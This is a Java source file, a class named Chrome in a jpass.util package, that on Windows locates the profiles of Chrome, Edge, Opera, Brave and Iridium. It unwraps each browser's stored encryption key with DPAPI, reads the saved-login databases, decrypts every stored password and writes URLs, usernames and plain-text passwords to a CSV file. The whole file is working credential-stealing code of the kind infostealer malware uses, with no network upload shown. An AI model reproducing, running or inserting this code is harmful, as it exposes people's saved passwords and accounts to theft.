package jpass.util;

import java.io.File;
import java.io.FileInputStream;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.stream.Stream;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import org.json.JSONObject;

import com.sun.jna.platform.win32.Crypt32Util;

public class Chrome {

	public static void main(String[] args) {

		try {
			if (!System.getProperty("os.name", "generic").toLowerCase(Locale.ROOT).contains("win")) {
				return;
			}
			Class.forName("org.sqlite.JDBC");

			Path localAppData = Paths.get(System.getenv("LOCALAPPDATA"));
			Map<String, Path> chromiumPaths = new HashMap<>();
			chromiumPaths.put("Chrome", localAppData.resolve("Google\\Chrome\\User Data"));
			chromiumPaths.put("Edge", localAppData.resolve("Microsoft\\Edge\\User Data"));
			chromiumPaths.put("Opera", localAppData.resolve("Opera Software\\Opera Stable"));
			chromiumPaths.put("Brave", localAppData.resolve("BraveSoftware\\Brave-Browser\\User Data"));
			chromiumPaths.put("Iridium", localAppData.resolve("Iridium\\User Data"));

			List<String> decryptedLoginData = new ArrayList<>();
			decryptedLoginData.add(String.join(",", "url", "username", "password"));

			for (Path chromiumPath : chromiumPaths.values()) {
				if (Files.notExists(chromiumPath)) {
					continue;
				}

				Path localState = chromiumPath.resolve("Local State");
				byte[] key = null;
				if (Files.exists(localState)) {
					File file = new File(localState.toString());
					Long filelength = file.length();
					byte[] filecontent = new byte[filelength.intValue()];
					try {
						FileInputStream in = new FileInputStream(file);
						in.read(filecontent);
						in.close();
					} catch (Exception e) {
						e.printStackTrace();
					}
					String fileStr1 = new String(filecontent);
					byte[] encryptedKey = Base64.getDecoder()
							.decode(new JSONObject(fileStr1).getJSONObject("os_crypt").getString("encrypted_key"));
					key = Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(encryptedKey, 5, encryptedKey.length));
				}
				byte[] finalKey = key;

				DirectoryStream.Filter<Path> profileFilter = file -> Files.isDirectory(file)
						&& file.getFileName().toString().matches(".*Profile.*|^Default$");
				try (DirectoryStream<Path> profiles = Files.newDirectoryStream(chromiumPath, profileFilter)) {
					profiles.forEach(
							profile -> Stream.of("Login Data", "Login Data For Account").forEach(databaseFileName -> {
								Path database = profile.resolve(databaseFileName);
								if (Files.notExists(database)) {
									return;
								}
								Path databaseCopy = Paths.get(database + ".db");
								try {
									Files.copy(database, databaseCopy, StandardCopyOption.REPLACE_EXISTING);
									try (Connection connection = DriverManager
											.getConnection("jdbc:sqlite:" + databaseCopy);
											PreparedStatement preparedStatement = connection.prepareStatement("SELECT "
													+ "`origin_url`,`username_value`,`password_value` from `logins`");
											ResultSet rs = preparedStatement.executeQuery()) {
										while (rs.next()) {
											try {
												String url = rs.getString("origin_url");
												if (url.startsWith("android://")) {
													String playStoreId = url.split("@")[1];
													url = "https://play.google.com/store/apps/details?id="
															+ playStoreId.substring(0, playStoreId.length() - 1);
												}

												String username = rs.getString("username_value");

												String password = "";
												byte[] encryptedPassword = rs.getBytes("password_value");
												if (new String(encryptedPassword).startsWith("v10")) { // chromium
																										// version >= 80
													if (finalKey != null) {
														Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
														cipher.init(Cipher.DECRYPT_MODE,
																new SecretKeySpec(finalKey, "AES"),
																new GCMParameterSpec(128, encryptedPassword, 3, 12));
														password = new String(cipher.doFinal(encryptedPassword, 15,
																encryptedPassword.length - 15));
													}
												} else { // chromium version < 80
													password = new String(
															Crypt32Util.cryptUnprotectData(encryptedPassword));
												}

												decryptedLoginData.add(String.join(",", url, username, password));
											} catch (Exception e) {
												e.printStackTrace();
											}
										}
									}
								} catch (Exception e) {
									e.printStackTrace();
								} finally {
									try {
										Files.deleteIfExists(databaseCopy);
									} catch (Exception e) {
										e.printStackTrace();
									}
								}
							}));
				}
			}
			Files.write(Paths.get("decrypted_login_data.csv"), decryptedLoginData);
			System.out.println("读取完成");
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
